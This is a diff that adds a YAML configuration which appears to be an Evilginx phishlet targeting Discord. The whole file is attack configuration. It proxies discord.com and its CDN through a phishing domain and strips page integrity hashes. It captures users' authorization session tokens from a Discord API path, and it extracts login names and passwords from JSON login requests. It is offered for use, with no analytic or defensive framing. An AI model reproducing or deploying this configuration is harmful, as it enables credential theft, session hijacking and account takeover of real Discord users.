@@ -1,0 +1,31 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+redirect_url: 'https://discord.com/'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'discordapp.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'discord.com', orig_sub: '', domain: 'discord.com', search: 'sha256-.{140}', replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'discord.com'
+    path: '/api/v9/users/@me/affinities/guilds'
+    name: 'token'
+    header: 'authorization'
+    type: 'http'
+
+credentials:
+  username:
+    key: ''
+    search: '"login":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'discord.com'
+  path: '/login'
